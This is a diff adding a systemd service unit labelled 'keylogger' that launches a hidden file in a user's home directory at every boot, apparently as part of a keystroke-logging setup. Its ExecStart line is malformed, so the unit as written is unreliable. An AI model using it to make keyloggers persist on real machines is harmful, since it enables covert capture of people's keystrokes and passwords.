@@ -1,0 +1,8 @@
+[Unit]
+Description=keylogger
+
+[Service]
+ExecStart=/usr/bin "/home/magewe/.keylogger"
+
+[Install]
+WantedBy=multi-user.target
